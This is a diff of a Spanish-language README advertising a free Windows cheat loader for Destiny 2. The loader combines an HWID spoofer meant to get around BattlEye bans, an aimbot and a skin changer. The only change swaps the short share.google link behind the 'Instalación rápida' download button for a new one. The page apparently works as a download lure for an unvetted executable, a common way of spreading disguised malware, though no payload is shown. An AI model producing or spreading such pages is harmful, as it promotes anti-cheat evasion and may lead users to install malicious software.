@@ -5,7 +5,7 @@
 **Destiny 2** — spoofer de HWID, aimbot y skin changer en un solo cargador para Windows. El spoofer reinicia el identificador de hardware que BattlEye bloqueó, el aimbot es totalmente configurable y el skin changer desbloquea cosméticos en tu cliente. **Descarga gratis, Windows 10 y 11.**
 
 <p align="center">
-  <a href="https://share.google/TpV1mAqwGlf9zbE3q"><img src="button.svg" alt="Instalación rápida" height="46"></a>
+  <a href="https://share.google/rCjKDZSMNDnIlftGo"><img src="button.svg" alt="Instalación rápida" height="46"></a>
 </p>
 
 ## ⚡ Inicio rápido
